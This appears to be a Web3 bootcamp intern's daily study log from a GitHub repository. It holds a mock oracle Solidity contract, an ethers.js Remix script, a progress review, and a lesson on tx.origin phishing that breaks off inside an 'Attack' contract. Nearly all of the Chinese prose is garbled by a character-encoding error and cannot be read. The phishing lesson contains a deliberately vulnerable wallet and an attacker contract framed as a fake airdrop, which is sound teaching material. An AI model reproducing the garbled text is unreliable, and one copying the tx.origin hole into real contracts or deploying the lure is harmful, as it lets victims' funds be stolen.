---
timezone: UTC+8
---

# liji3597

**GitHub ID:** liji3597

**Telegram:** 

## Self-introduction

Web3 å®ä¹ è®¡åˆ’ 2025 å†¬å­£å®ä¹ ç”Ÿ

## Notes

<!-- Content_START -->
# 2026-01-27
<!-- DAILY_CHECKIN_2026-01-27_START -->
# ç¬¬ 16 å¤©ï¼šé¢„è¨€æœº (Oracles) â€”â€” æ‰“ç ´åŒºå—é“¾çš„â€œæ–­ç½‘â€è¯…å’’

ä½œä¸ºåµŒå…¥å¼å·¥ç¨‹å¸ˆï¼Œä½ çŸ¥é“ MCU å¦‚æœæ²¡æœ‰ä¼ æ„Ÿå™¨ï¼ˆADC/GPIOï¼‰å°±æ˜¯ä¸ªçå­ã€‚

åŒæ ·çš„ï¼ŒåŒºå—é“¾è™½ç„¶ç®—åŠ›å¼ºå¤§ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªè‡´å‘½ç¼ºé™·ï¼š**å®ƒæ˜¯â€œæ–­ç½‘â€çš„**ã€‚

**æ™ºèƒ½åˆçº¦æ— æ³•å‘èµ· HTTP è¯·æ±‚ã€‚** ä½ ä¸èƒ½åœ¨ Solidity é‡Œå†™ `http.get("weather.com")`ã€‚

-   **ä¸ºä»€ä¹ˆï¼Ÿ** å› ä¸ºåŒºå—é“¾è¦æ±‚ **ç¡®å®šæ€§ (Determinism)**ã€‚å¦‚æœå…¨çƒ 10,000 ä¸ªèŠ‚ç‚¹è¿è¡Œä½ çš„ä»£ç ï¼Œæœ‰çš„èŠ‚ç‚¹ç½‘é€Ÿå¿«æ‹¿åˆ°äº† 25åº¦ï¼Œæœ‰çš„èŠ‚ç‚¹æ–­ç½‘äº†æ‹¿åˆ° 0åº¦ï¼Œå…±è¯†å°±ä¼šå´©æºƒã€‚
    

æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ **é¢„è¨€æœº (Oracle)**ã€‚

## 1\. ç†è®ºæ˜ å°„ï¼šADC ä¸ å¤–éƒ¨ä¸–ç•Œ

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-27-1769514809505-image.png)

**æ¶æ„æ¨¡å¼ï¼šè¯·æ±‚ - å“åº” (Request-Response)**

è¿™å°±åƒ **DMA ä¸­æ–­æ¨¡å¼**ï¼š

1.  **CPU (åˆçº¦):** å‘èµ·è¯·æ±‚ â€œæˆ‘è¦è¯»å–æ¸©åº¦â€ -> å†™å…¥å¯„å­˜å™¨ã€‚
    
2.  **ADC (Oracle):** æ„ŸçŸ¥åˆ°è¯·æ±‚ -> å¼€å§‹è½¬æ¢ï¼ˆå»é“¾ä¸‹æŸ¥æ•°æ®ï¼‰ã€‚
    
3.  **ISR (å›è°ƒ):** è½¬æ¢å®Œæˆ -> è§¦å‘ä¸­æ–­ï¼ŒæŠŠæ•°æ®å¡«å›å†…å­˜ã€‚
    

* * *

## 2\. å®æˆ˜ï¼šæ„å»ºä¸€ä¸ªâ€œæ¨¡æ‹Ÿé¢„è¨€æœºâ€ç³»ç»Ÿ

å› ä¸ºæ¥å…¥çœŸå®çš„ Chainlink éœ€è¦æµ‹è¯•å¸ï¼ˆLink Tokenï¼‰å’Œå¤æ‚çš„é…ç½®ï¼Œæˆ‘ä»¬ä»Šå¤©**æ‰‹å†™ä¸€ä¸ªç®€æ˜“ç‰ˆ Oracle** æ¥å½»åº•ç†è§£å®ƒçš„åŸç†ã€‚

æˆ‘ä»¬å°†æ„å»ºä¸¤ä¸ªåˆçº¦ï¼š

1.  `MockOracle` **(æœåŠ¡ç«¯):** æ¨¡æ‹Ÿ Chainlinkï¼Œè´Ÿè´£æ¥æ”¶è¯·æ±‚å’Œå›å¡«æ•°æ®ã€‚
    
2.  `SmartGreenhouse` **(å®¢æˆ·ç«¯):** ä½ çš„ä¸šåŠ¡åˆçº¦ï¼Œæƒ³æ ¹æ®å¤©æ°”è‡ªåŠ¨æ§åˆ¶æ´’æ°´å™¨ã€‚
    

è¯·åœ¨ Remix ä¸­æ–°å»º `Day16_Oracle.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. æ¨¡æ‹Ÿé¢„è¨€æœº (ADC) ---
contract MockOracle {
    // å®šä¹‰ä¸€ä¸ªè¯·æ±‚IDè®¡æ•°å™¨
    uint256 private requestId = 0;
    
    // è®°å½•è°å‘èµ·äº†è¯·æ±‚ (Mapping: RequestID => ClientAddress)
    mapping(uint256 => address) public pendingRequests;

    // äº‹ä»¶ï¼šé€šçŸ¥é“¾ä¸‹èŠ‚ç‚¹ "æœ‰äººè¦æ•°æ®ï¼"
    event RequestData(uint256 id, string url);

    // 1. æ¥æ”¶è¯·æ±‚ (CPU å‘æŒ‡ä»¤ç»™ ADC)
    function requestWeather(string memory _url) external returns (uint256) {
        requestId++;
        pendingRequests[requestId] = msg.sender;
        
        // å‘å°„äº‹ä»¶ï¼Œé“¾ä¸‹çš„ Python/JS è„šæœ¬ä¼šç›‘å¬åˆ°è¿™ä¸ªäº‹ä»¶
        emit RequestData(requestId, _url);
        return requestId;
    }

    // 2. å›å¡«æ•°æ® (ADC è½¬æ¢å®Œæˆï¼Œè§¦å‘ä¸­æ–­)
    // åœ¨çœŸå®åœºæ™¯ä¸­ï¼Œè¿™ä¸ªå‡½æ•°åªæœ‰ Chainlink èŠ‚ç‚¹èƒ½è°ƒç”¨
    function fulfill(uint256 _id, uint256 _temperature) external {
        address client = pendingRequests[_id];
        require(client != address(0), "Request not found");

        // å›è°ƒå®¢æˆ·ç«¯çš„ fulfillWeather å‡½æ•°
        // è¿™é‡Œç”¨äº†æ¥å£è°ƒç”¨çš„æ–¹å¼
        IGreenhouse(client).fulfillWeather(_id, _temperature);
        
        // æ¸…é™¤è¯·æ±‚
        delete pendingRequests[_id];
    }
}

// å®šä¹‰å®¢æˆ·ç«¯æ¥å£ (ä¸ºäº†è®© Oracle èƒ½å›è°ƒ)
interface IGreenhouse {
    function fulfillWeather(uint256 _requestId, uint256 _temp) external;
}

// --- 2. æ™ºèƒ½æ¸©å®¤ (ç”¨æˆ·åº”ç”¨) ---
contract SmartGreenhouse is IGreenhouse {
    MockOracle public oracle;
    
    uint256 public temperature; // å½“å‰æ¸©åº¦
    bool public sprinklerOn;    // æ´’æ°´å™¨çŠ¶æ€
    
    // åªæœ‰ Oracle èƒ½å›è°ƒæˆ‘ (å®‰å…¨æ£€æŸ¥)
    modifier onlyOracle() {
        require(msg.sender == address(oracle), "Only Oracle can call this");
        _;
    }

    constructor(address _oracleAddress) {
        oracle = MockOracle(_oracleAddress);
    }

    // A. å‘èµ·è¯·æ±‚
    function updateWeather() public {
        // è°ƒç”¨ Oracle åˆçº¦
        oracle.requestWeather("api.weather.com/shanghai");
    }

    // B. æ¥æ”¶å›è°ƒ (ç›¸å½“äº ISR ä¸­æ–­æœåŠ¡å‡½æ•°)
    function fulfillWeather(uint256, uint256 _temp) external override onlyOracle {
        temperature = _temp;
        
        // è‡ªåŠ¨åŒ–é€»è¾‘: å¦‚æœè¶…è¿‡ 30åº¦ï¼Œæ‰“å¼€æ´’æ°´å™¨
        if (_temp > 30) {
            sprinklerOn = true;
        } else {
            sprinklerOn = false;
        }
    }
}
```

* * *

## 3\. å®éªŒæ­¥éª¤ (æ‰®æ¼”ä¸‰ä¸ªè§’è‰²)

**è§’è‰² A: éƒ¨ç½²è€…**

1.  éƒ¨ç½² `MockOracle`ã€‚**å¤åˆ¶å®ƒçš„åœ°å€**ã€‚
    
2.  éƒ¨ç½² `SmartGreenhouse`ï¼Œæ„é€ å‡½æ•°å¡«å…¥ `MockOracle` çš„åœ°å€ã€‚
    

**è§’è‰² B: è§¦å‘å™¨ (æ¨¡æ‹Ÿå®šæ—¶ä»»åŠ¡)**

1.  åœ¨ `SmartGreenhouse` ä¸­ç‚¹å‡» `updateWeather`ã€‚
    
2.  _è§‚å¯Ÿæ—¥å¿—ï¼š_ æ­¤æ—¶ `temperature` è¿˜æ˜¯ 0ã€‚å› ä¸ºè¿™åªæ˜¯å‘èµ·äº†è¯·æ±‚ï¼Œæ•°æ®è¿˜æ²¡å›æ¥ã€‚
    
3.  **å»** `MockOracle` **æŸ¥çœ‹æ—¥å¿— (Logs)ï¼š** åº”è¯¥èƒ½çœ‹åˆ° `RequestData` äº‹ä»¶ï¼ŒåŒ…å« `id=1`ã€‚
    

**è§’è‰² C: é¢„è¨€æœºèŠ‚ç‚¹ (æ¨¡æ‹Ÿé“¾ä¸‹è„šæœ¬)**

_ç°åœ¨ä½ è¦æ‰‹åŠ¨æ‰®æ¼” Chainlink èŠ‚ç‚¹ï¼ŒæŠŠæ•°æ®å¡«å›å»ã€‚_

1.  å›åˆ° `MockOracle` åˆçº¦ã€‚
    
2.  æ‰¾åˆ° `fulfill` å‡½æ•°ã€‚
    
3.  è¾“å…¥å‚æ•°ï¼š
    
    -   `_id`: `1` (åˆšæ‰ç”Ÿæˆçš„è¯·æ±‚ID)ã€‚
        
    -   `_temperature`: `35` (æ¨¡æ‹Ÿ 35åº¦é«˜æ¸©)ã€‚
        
4.  ç‚¹å‡» transactã€‚
    

**è§’è‰² D: éªŒè¯ç»“æœ**

1.  å›åˆ° `SmartGreenhouse`ã€‚
    
2.  ç‚¹å‡» `temperature` -> åº”è¯¥æ˜¯ `35`ã€‚
    
3.  ç‚¹å‡» `sprinklerOn` -> åº”è¯¥æ˜¯ `true` (å› ä¸º 35 > 30)ã€‚
    

* * *

### æ·±åº¦æ€è€ƒ

åšå®Œè¿™ä¸ªå®éªŒï¼Œä½ å°±ç†è§£äº† **DeFi (å»ä¸­å¿ƒåŒ–é‡‘è)** æ˜¯æ€ä¹ˆè¿è¡Œçš„ã€‚

Uniswap çš„ä»·æ ¼ã€Aave çš„æ¸…ç®—é€»è¾‘ï¼Œå…¨éƒ½æ˜¯é€šè¿‡è¿™ç§ **Request (Event) -> Off-chain Fetch -> Callback** çš„æ¨¡å¼è·å–å¤–éƒ¨ä»·æ ¼çš„ã€‚

**ä»Šæ—¥ä»»åŠ¡ï¼š**

å®Œæˆä¸Šè¿°â€œæ‰‹åŠ¨é¢„è¨€æœºâ€æµç¨‹ã€‚

1.  å…ˆå‘èµ·è¯·æ±‚ï¼Œæˆªå›¾è¯æ˜ `temperature` æ˜¯ 0ã€‚
    
2.  æ‰‹åŠ¨ `fulfill` å¡«å…¥ `35`ã€‚
    
3.  æˆªå›¾è¯æ˜ `SmartGreenhouse` çš„ `sprinklerOn` è‡ªåŠ¨å˜ä¸ºäº† `true`ã€‚
    

è¿™å°±æ˜¯åŒºå—é“¾è¿æ¥ç°å®ä¸–ç•Œçš„å”¯ä¸€æ¡¥æ¢ï¼
<!-- DAILY_CHECKIN_2026-01-27_END -->

# 2026-01-26
<!-- DAILY_CHECKIN_2026-01-26_START -->

# **ç¬¬ 15 å¤©ï¼šWeb3.js / Ethers.js â€”â€” åŒºå—é“¾çš„â€œé©±åŠ¨åº“â€**

## 1\. ç†è®ºæ˜ å°„ï¼šå¦‚ä½•ä¸â€œäº‘ç«¯å•ç‰‡æœºâ€å¯¹è¯ï¼Ÿ

ç°åœ¨ä½ çš„ `LogisticsSystem` åˆçº¦å·²ç»éƒ¨ç½²åœ¨åŒºå—é“¾ï¼ˆäº‘ç«¯å•ç‰‡æœºï¼‰ä¸Šäº†ã€‚ä¹‹å‰æˆ‘ä»¬éƒ½æ˜¯ç‚¹ Remix çš„æŒ‰é’®æ¥äº¤äº’ï¼Œè¿™ç›¸å½“äºç”¨ **J-Link è°ƒè¯•å™¨** æ‰‹åŠ¨æ”¹å¯„å­˜å™¨ã€‚

ç°åœ¨æˆ‘ä»¬è¦å†™ä»£ç æ¥è‡ªåŠ¨åŒ–äº¤äº’ã€‚

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-26-1769440312249-image.png)

**æ ¸å¿ƒå…¬å¼ï¼š**

> **äº¤äº’å¯¹è±¡ = åˆçº¦åœ°å€ (Address) + æ¥å£å®šä¹‰ (ABI) + é’±åŒ…ç§é’¥ (Signer)**

* * *

## 2\. å…³é”®æ¦‚å¿µï¼šABI (åº”ç”¨äºŒè¿›åˆ¶æ¥å£)

è¿™æ˜¯è¿æ¥â€œå›ºä»¶â€å’Œâ€œè½¯ä»¶â€çš„æ¡¥æ¢ã€‚

åœ¨ Remix ä¸­ï¼Œå½“ä½ ç¼–è¯‘ `LogisticsSystem` æ—¶ï¼Œç¼–è¯‘å™¨ç”Ÿæˆäº†ä¸€ä¸ª JSON æ•°ç»„ï¼Œæè¿°äº†æ‰€æœ‰å‡½æ•°ã€‚

**é•¿è¿™ä¸ªæ ·å­ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š**

JSON

```
[
    {
        "type": "function",
        "name": "createOrder",
        "inputs": [{"type": "uint256"}, {"type": "string"}]
    },
    {
        "type": "event",
        "name": "StatusUpdated",
        ...
    }
]
```

è¿™å°±æ˜¯ JS è„šæœ¬çŸ¥é“â€œå¦‚ä½•ç»„åŒ…â€çš„è¯´æ˜ä¹¦ã€‚

* * *

## 3\. å®æˆ˜æ“ä½œï¼šç¼–å†™ä½ çš„ç¬¬ä¸€ä¸ªâ€œä¸Šä½æœºè„šæœ¬â€

æˆ‘ä»¬ä¸éœ€è¦å®‰è£…å¤æ‚çš„ Node.js ç¯å¢ƒï¼ŒRemix è‡ªå¸¦äº†ä¸€ä¸ªè„šæœ¬è¿è¡Œå™¨ã€‚

æ­¥éª¤ 1ï¼šè·å–â€œè®¾å¤‡â€ä¿¡æ¯

1.  ç¡®ä¿ä½ çš„ `LogisticsSystem` è¿˜åœ¨éƒ¨ç½²çŠ¶æ€ï¼ˆå¦‚æœä¹‹å‰çš„å…³äº†ï¼Œè¯·é‡æ–°éƒ¨ç½²ä¸€ä¸ªï¼‰ã€‚
    
2.  **å¤åˆ¶åˆçº¦åœ°å€**ï¼šä¾‹å¦‚ `0xD7...`ã€‚
    
3.  **å¤åˆ¶ ABI**ï¼š
    
    -   ç‚¹å‡» Remix å·¦ä¾§ç¬¬ 3 ä¸ªå›¾æ ‡ï¼ˆç¼–è¯‘å™¨çš„å›¾æ ‡ï¼‰ã€‚
        
    -   åœ¨æœ€ä¸‹æ–¹æ‰¾åˆ° **ABI** æŒ‰é’®ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå°å°çš„å¤åˆ¶å›¾æ ‡ï¼Œæˆ–è€…å†™ç€ â€œABIâ€ï¼‰ã€‚
        
    -   _ç‚¹å‡»å¤åˆ¶ï¼Œæ‰¾ä¸ªè®°äº‹æœ¬æš‚å­˜ä¸€ä¸‹ï¼Œä¸€ä¼šè¦ç”¨ã€‚_
        

**æ­¥éª¤ 2ï¼šç¼–å†™è„šæœ¬**

1.  åœ¨ Remix **File Explorer** (æ–‡ä»¶æµè§ˆå™¨) ä¸­ã€‚
    
2.  æ‰“å¼€ `scripts` æ–‡ä»¶å¤¹ï¼ˆå¦‚æœæ²¡æœ‰ï¼Œå³é”®æ–°å»ºä¸€ä¸ªï¼‰ã€‚
    
3.  æ–°å»ºæ–‡ä»¶ `Day15_Interact.js` (æ³¨æ„åç¼€æ˜¯ `.js`)ã€‚
    
4.  è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š
    

JavaScript

```
// Remix è‡ªåŠ¨æ³¨å…¥äº† ethers åº“ï¼Œå°±åƒè‡ªåŠ¨ include äº†å¤´æ–‡ä»¶
// è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥å‡½æ•° (Async/Await)
(async function () {
    try {
        // --- 1. é…ç½®å‚æ•° (è¯·å¡«å…¥æ‚¨çš„çœŸå®ä¿¡æ¯) ---
        const contractAddress = "0x..."; // <--- TODO: ç²˜è´´åˆšæ‰å¤åˆ¶çš„åˆçº¦åœ°å€
        const contractName = "LogisticsSystem"; // åˆçº¦åå­—

        console.log(`Connecting to contract: ${contractName} at ${contractAddress}`);

        // --- 2. è·å–åˆçº¦å¯¹è±¡ (ä¸Šä½æœºåˆå§‹åŒ–) ---
        // åœ¨ Remix è„šæœ¬é‡Œï¼Œartifacts å¸®æˆ‘ä»¬è‡ªåŠ¨ç®¡ç†äº† ABIï¼Œä¸ç”¨æ‰‹åŠ¨ç²˜è´´ä¸€å¤§å¨ JSON
        // è¿™ç›¸å½“äº: Handle_t hDevice = InitDevice(Address);
        const metadata = JSON.parse(await remix.call('fileManager', 'getFile', `artifacts/${contractName}.json`));
        const signer = (await ethers.getSigners())[0]; // è·å–å½“å‰è´¦å· (Admin)
        
        // å®ä¾‹åŒ–åˆçº¦
        const contract = new ethers.Contract(contractAddress, metadata.abi, signer);

        // --- 3. è¯»æ•°æ® (Read) ---
        // è°ƒç”¨ mapping: orders(101)
        console.log("Reading Order 101 info...");
        const orderId = 101;
        const orderInfo = await contract.orders(orderId);
        
        // æ‰“å°ç»“æœ (æ³¨æ„: åµŒå…¥å¼é‡Œçš„æšä¸¾ enum è¿”å›çš„æ˜¯æ•´æ•°)
        console.log(`[Result] Item: ${orderInfo.item}`);
        console.log(`[Result] State: ${orderInfo.state} (0=Pending, 1=Shipped, 2=Delivered)`);
        console.log(`[Result] Location: ${orderInfo.location}`);

        // --- 4. å†™æ•°æ® (Write) ---
        // åªæœ‰å½“æ‚¨æ˜¯ Admin ä¸”æƒ³åšæ“ä½œæ—¶æ‰è§£å¼€ä¸‹é¢æ³¨é‡Š
        // console.log("Updating status...");
        // const tx = await contract.shipOrder(101, "Hong Kong Port");
        // await tx.wait(); // ç­‰å¾…åŒºå—ç¡®è®¤
        // console.log("Transaction confirmed!");

    } catch (e) {
        console.log(e.message);
    }
})();
```

**æ­¥éª¤ 3ï¼šè¿è¡Œè„šæœ¬**

1.  æ‰“å¼€ `Day15_Interact.js` æ–‡ä»¶ã€‚
    
2.  **å…³é”®è®¾ç½®ï¼š** è®°å¾—æŠŠç¬¬ 6 è¡Œçš„ `contractAddress` æ¢æˆä½ åˆšæ‰éƒ¨ç½²çš„çœŸå®åœ°å€ï¼
    
3.  ç‚¹å‡»æ–‡ä»¶ç¼–è¾‘åŒºå·¦ä¸Šè§’çš„ç»¿è‰²ä¸‰è§’å½¢ **Play** æŒ‰é’®ã€‚
    
    -   æˆ–è€…æŒ‰ `Ctrl + Shift + S`ã€‚
        
4.  **è§‚å¯Ÿæ§åˆ¶å°ï¼š**
    
    -   ä½ åº”è¯¥èƒ½çœ‹åˆ°ç±»ä¼¼ä¸²å£æ‰“å°çš„ä¿¡æ¯ï¼š
        
    -   `[Result] Item: STM32 Board`
        
    -   `[Result] State: 1`
        
    -   `[Result] Location: Shenzhen Warehouse`
        

* * *

![å±å¹•æˆªå›¾ 2026-01-26 230142.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-26-1769440565560-_____2026-01-26_230142.png)

### æ·±åº¦æ€è€ƒ

è¿™ä¸ªè„šæœ¬è™½ç„¶ç®€å•ï¼Œä½†å®ƒæ­ç¤ºäº† DApp (å»ä¸­å¿ƒåŒ–åº”ç”¨) çš„æœ¬è´¨ï¼š

**å‰ç«¯ç½‘é¡µ (React/Vue) + Ethers.js + æ™ºèƒ½åˆçº¦ = DApp**

è¿™å°±åƒï¼š

**ä¸Šä½æœºç•Œé¢ (Qt) + ä¸²å£é©±åŠ¨åº“ + MCU å›ºä»¶ = ç‰©è”ç½‘ç³»ç»Ÿ**

### **ä»Šæ—¥ä½œä¸šï¼š**

1.  è¿è¡Œè„šæœ¬ï¼ŒæˆåŠŸè¯»å–å‡ºä½ æ˜¨å¤©å®éªŒä¸­çš„è®¢å•ä¿¡æ¯ã€‚
    
2.  **æŒ‘æˆ˜ï¼š** å°è¯•åœ¨è„šæœ¬é‡Œè°ƒç”¨å†™å‡½æ•°ã€‚
    
    -   æ¯”å¦‚ï¼Œå…ˆåœ¨ Remix æŒ‰é’®ä¸Šæ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªæ–°è®¢å• `102`ã€‚
        
    -   ç„¶åä¿®æ”¹è„šæœ¬ï¼Œè¯»å– `102` çš„ä¿¡æ¯ã€‚
        
    -   _è¿›é˜¶æŒ‘æˆ˜ï¼š_ èƒ½å¦åœ¨è„šæœ¬é‡Œç›´æ¥è°ƒç”¨ `createOrder`ï¼Ÿ(è¿™éœ€è¦ä½ æŸ¥é˜… ethers.js æ–‡æ¡£å…³äº `contract.functions` çš„ç”¨æ³•ï¼Œæˆ–è€…å‚è€ƒä»£ç æ³¨é‡Šé‡Œçš„å†™æ³•)ã€‚
<!-- DAILY_CHECKIN_2026-01-26_END -->

# 2026-01-25
<!-- DAILY_CHECKIN_2026-01-25_START -->



ç¬¬ä¸€é˜¶æ®µï¼š1æœˆ19æ—¥ - 1æœˆ20æ—¥

**ã€ä¸»é¢˜ï¼šæ–¹å‘æ¢ç´¢ä¸é¡¶å±‚è®¾è®¡ã€‘**

-   **åŸå®šè®¡åˆ’ï¼š** æ²‰ä¸‹å¿ƒå­¦ä¹  Solidity åŸºç¡€è¯­æ³•ã€Web3 å®ä¹ æ‰‹å†Œã€ä¸­æ–‡æ’ç‰ˆè§„èŒƒã€‚
    
-   **å®é™…æ‰§è¡Œï¼š** å°†ç²¾åŠ›é›†ä¸­åœ¨äº†**ç¤¾åŒºæ„å»ºçš„æˆ˜ç•¥æ€è€ƒ**ä¸Šã€‚å¹¶æ²¡æœ‰å±€é™äº"å†™ä»£ç "ï¼Œè€Œæ˜¯æ€è€ƒå¦‚ä½•å»ºç«‹ä¸€ä¸ªå…³äº"ä»£ç å®¡è®¡"ã€"Rust" å’Œ "Solana" çš„æŠ€æœ¯ç¤¾åŒºã€‚è¿™ä¸ªé˜¶æ®µæ›´åƒæ˜¯ä¸€ä¸ª**äº§å“ç»ç†**ï¼Œåœ¨è§„åˆ’æœªæ¥çš„æŠ€æœ¯è·¯çº¿å›¾å’Œèµ„æºæ•´åˆæ–¹å‘ã€‚
    
-   **å…³é”®æˆæœï¼š** ç¡®ç«‹äº†"æŠ€æœ¯æ·±åº¦"ï¼ˆå®¡è®¡/åº•å±‚è¯­è¨€ï¼‰ä½œä¸ºç¤¾åŒºæ ¸å¿ƒç«äº‰åŠ›ï¼Œè·³å‡ºäº†æ³›æ³›çš„å­¦ä¹ æ¨¡å¼ã€‚
    

* * *

ç¬¬äºŒé˜¶æ®µï¼š1æœˆ21æ—¥ - 1æœˆ22æ—¥

**ã€ä¸»é¢˜ï¼šæ·±æ°´åŒºå®æˆ˜ä¸æœåŠ¡å™¨è¿ç»´ã€‘**

-   **åŸå®šè®¡åˆ’ï¼š** æ·±å…¥å­¦ä¹ å·¥å…·é“¾ï¼Œé…ç½® Hardhat ç¯å¢ƒï¼Œå­¦ä¹  Ethers.js è„šæœ¬äº¤äº’ã€‚
    
-   **å®é™…æ‰§è¡Œï¼š** **åç¦»è®¡åˆ’æœ€è¿œ**ä½†ä¹Ÿæœ€"ç¡¬æ ¸"\*\*çš„ä¸¤å¤©ã€‚æ²¡æœ‰åœ¨æœ¬åœ°é…ç½®æµ‹è¯•ç¯å¢ƒï¼Œè€Œæ˜¯ç›´æ¥å†²è¿›äº†äº‘ç«¯éƒ¨ç½²ã€‚ä¸ºäº†è¿è¡Œ **NOFX äº¤æ˜“æœºå™¨äºº**ï¼Œä½ ä»é›¶å¼€å§‹æ‘¸ç´¢ **Railway** å’Œ **VPS** çš„é…ç½®ã€‚å®é™…ä¸Šæ˜¯åœ¨é€šè¿‡è§£å†³æŠ¥é”™æ¥å­¦ä¹ ç¯å¢ƒé…ç½®ï¼Œè€Œéé€šè¿‡æ•™ç¨‹ã€‚
    
-   **æŠ€æœ¯å€ºï¼š** å› ä¸ºå¿™äºéƒ¨ç½²ï¼Œ**Hardhat æµ‹è¯•æ¡†æ¶**å’Œ**Ethers.js çš„ä»£ç ç¼–å†™**è¢«æç½®ã€‚è¿™æ˜¯æˆä¸ºåˆçº¦å¼€å‘è€…çš„å¿…ä¿®è¯¾ï¼Œç›®å‰å¤„äº"ç¼ºè¯¾"çŠ¶æ€ã€‚
    

* * *

ç¬¬ä¸‰é˜¶æ®µï¼š1æœˆ23æ—¥ - 1æœˆ24æ—¥

**ã€ä¸»é¢˜ï¼šå·¥å…·éƒ¨ç½²ä¸å›å½’ä¸»çº¿ã€‘**

-   **åŸå®šè®¡åˆ’ï¼š** Remix å®è·µã€Ethernaut æŒ‘æˆ˜ã€å‘¨ä¼šåˆ†äº«ã€‚
    
-   **å®é™…æ‰§è¡Œï¼š** å®æˆ˜æƒ¯æ€§ä¾ç„¶å¾ˆå¼ºã€‚ç»§ç»­åœ¨é˜¿é‡Œäº‘ (Alibaba Cloud) ä¸Šéƒ¨ç½² **Antigravity-Manager** å·¥å…·ï¼Œè¿›ä¸€æ­¥å·©å›ºäº† **Docker** å’Œ **Linux å‘½ä»¤è¡Œ** çš„æŠ€èƒ½ã€‚å€¼å¾—è‚¯å®šçš„æ˜¯ï¼Œåœ¨æŠ˜è…¾å·¥å…·çš„åŒæ—¶ï¼Œå¼€å§‹**å›å½’ Solidity å­¦ä¹ **ï¼Œè¯¢é—®äº†å…·ä½“çš„è¯¾ç¨‹è¿›åº¦å’Œä»£ç é—®é¢˜ï¼Œè¯•å›¾å°†è¿ç»´ç»éªŒä¸ä»£ç é€»è¾‘ç»“åˆã€‚
    
-   **å…³é”®æˆæœï¼š** æˆåŠŸè·‘é€šäº†å¤šä¸ªå¤æ‚çš„ Web3 å·¥å…·ï¼ŒéªŒè¯äº†åŠ¨æ‰‹èƒ½åŠ›ï¼›åŒæ—¶æ„è¯†åˆ°åŸºç¡€è¯­æ³•çš„é‡è¦æ€§ï¼Œå¼€å§‹å›å¡«çŸ¥è¯†ã€‚
<!-- DAILY_CHECKIN_2026-01-25_END -->

# 2026-01-24
<!-- DAILY_CHECKIN_2026-01-24_START -->




# ç¬¬13å¤©ï¼šèº«ä»½ä¼ªé€  (`tx.origin`) ä¸ è§’è‰²ç®¡ç†

## 1\. ç†è®ºæ˜ å°„ï¼šè°æ‰æ˜¯çœŸæ­£çš„è°ƒç”¨è€…ï¼Ÿ

åœ¨ Solidity ä¸­ï¼Œæœ‰ä¸¤ä¸ªå˜é‡ç”¨æ¥è¯†åˆ«â€œè°è°ƒç”¨äº†æˆ‘â€ï¼Œåˆå­¦è€…ææ˜“æ··æ·†ï¼š

| å˜é‡ | å«ä¹‰ | åµŒå…¥å¼ç±»æ¯” | å®‰å…¨æ€§ |
| msg.sender | ç›´æ¥è°ƒç”¨è€… (ä¸Šä¸€è·³) | MAC åœ°å€ / ä¸Šä¸€è·³è·¯ç”±ã€‚è°ç›´æ¥å‘åŒ…ç»™æˆ‘ï¼Œå°±æ˜¯è°ã€‚ | å®‰å…¨ (æ¨è) |
| tx.origin | äº¤æ˜“å‘èµ·è€… (æºå¤´) | æº IP åœ°å€ã€‚è°æœ€å¼€å§‹å‘èµ·äº†è¿™ç¬”æ“ä½œï¼Œä¸ç®¡ä¸­é—´ç»è¿‡äº†å¤šå°‘è·¯ç”±å™¨ã€‚ | å±é™© (æ…ç”¨) |

**æ”»å‡»åŸç†ï¼š**

å¦‚æœä½ ç”¨ `tx.origin` åšé‰´æƒï¼ˆåˆ¤æ–­ `tx.origin == admin`ï¼‰ï¼Œé»‘å®¢å¯ä»¥è¯±å¯¼ä½ è°ƒç”¨ä»–çš„æ¶æ„åˆçº¦ã€‚

1.  **ä½  (Admin)** è°ƒç”¨ **æ¶æ„åˆçº¦ (Malicious)**ã€‚
    
2.  **æ¶æ„åˆçº¦** è½¬å¤´è°ƒç”¨ **ä½ çš„é’±åŒ… (Wallet)**ã€‚
    
3.  åœ¨ **Wallet** çœ‹æ¥ï¼š
    
    -   `msg.sender` æ˜¯ **æ¶æ„åˆçº¦**ã€‚
        
    -   `tx.origin` ä¾ç„¶æ˜¯ **ä½  (Admin)**ï¼
        
    -   **ç»“æœï¼š** é‰´æƒé€šè¿‡ï¼Œé’±è¢«è½¬èµ°ã€‚
        

* * *

## 2\. å®æˆ˜æ¼”ç»ƒï¼šæ„å»ºâ€œå¯è¢«é’“é±¼â€çš„é’±åŒ…

æˆ‘ä»¬è¦å†™ä¸¤ä¸ªåˆçº¦ï¼šä¸€ä¸ªç”¨ `tx.origin` é‰´æƒçš„å‚»é’±åŒ…ï¼Œä¸€ä¸ªä¼ªè£…æˆâ€œå…è´¹é¢†å¥–â€çš„æ”»å‡»åˆçº¦ã€‚

**è¯·åœ¨ Remix ä¸­æ–°å»º** `Day13_Phishing.sol`**ï¼š**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. å—å®³è€…é’±åŒ… (Phishable Wallet) ---
contract Phishable {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // [æ¼æ´]ï¼šä½¿ç”¨ tx.origin åˆ¤æ–­æƒé™
    // åªè¦æºå¤´æ˜¯ ownerï¼Œå°±å…è®¸è½¬è´¦ã€‚å¿½ç•¥äº†ä¸­é—´äººå¯èƒ½æ˜¯é»‘å®¢ã€‚
    function withdrawAll(address _recipient) public {
        require(tx.origin == owner, "Hacker detected? No, you look like owner.");
        payable(_recipient).transfer(address(this).balance);
    }
}

// --- 2. æ”»å‡»è€…åˆçº¦ (Malicious Contract) ---
contract Attack {
    Phishable public victim;
    address payable public hacker;

    constructor(Phishable _victim) {
        victim = _victim;
        hacker = payable(msg.sender);
    }

    // è¯±é¥µå‡½æ•°ï¼šä¼ªè£…æˆâ€œé¢†å–ç©ºæŠ•â€æˆ–â€œçœ‹ä¼¼æ— å®³çš„é€»è¾‘â€
